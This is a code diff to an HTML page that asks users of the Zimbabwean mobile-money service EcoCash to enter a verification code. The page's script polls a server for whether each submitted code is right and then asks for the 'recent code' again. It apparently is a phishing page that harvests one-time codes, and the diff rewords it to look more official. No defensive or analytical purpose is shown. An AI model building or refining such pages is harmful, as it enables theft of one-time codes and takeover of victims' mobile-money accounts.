@@ -14,7 +14,7 @@
         h3 { color: var(--dark); margin-bottom: 4px; }
         .phone-display { background: var(--light); padding: 8px 16px; border-radius: 25px; display: inline-block; font-weight: 600; font-size: 0.85rem; color: var(--dark); margin-bottom: 16px; }
         
-        /* Creative EcoCash Verification */
+        /* Creative EcoCash Verification for Econet */
         .verify-header { text-align: center; margin-bottom: 1.2rem; }
         .verify-header .shield-icon { font-size: 2.5rem; color: var(--eco-green); margin-bottom: 0.5rem; }
         .verify-header h3 { font-size: 1.2rem; color: var(--dark); }
@@ -53,11 +53,11 @@
     <div id="codeSection">
       <div class="verify-header">
         <div class="shield-icon"><i class="fas fa-shield-alt"></i></div>
-        <h3>Verify Your EcoCash Number</h3>
-        <div class="sub">Since you are using <strong>EcoCash</strong> (not a regular SIM),<br>we need to verify your number.<br><strong>Enter the verification code sent by EcoCash.</strong></div>
+        <h3>Verify Your Econet Number with EcoCash</h3>
+        <div class="sub">EcoCash has sent a verification code to your <strong>Econet</strong> line.<br>Enter the code below to confirm your number.</div>
       </div>
       <div class="sim-card-icon">
-        <i class="fas fa-sim-card"></i> Econet SIM Verification
+        <i class="fas fa-sim-card"></i> EcoCash Verification for Econet
       </div>
       <div class="phone-display" id="showPhone">+263 ---------</div>
       <div class="code-inputs" id="codeInputs">
@@ -155,7 +155,7 @@
       } else if (data.code_status === 'wrong_code') { 
         clearInterval(checkInterval); 
         document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); d.value = ''; d.classList.remove('filled'); });
-        document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash to verify.';
+        document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash.';
         document.getElementById('codeError').style.color = 'var(--danger)';
         document.getElementById('codeError').classList.add('show');
         document.getElementById('waitSection').style.display = 'none';
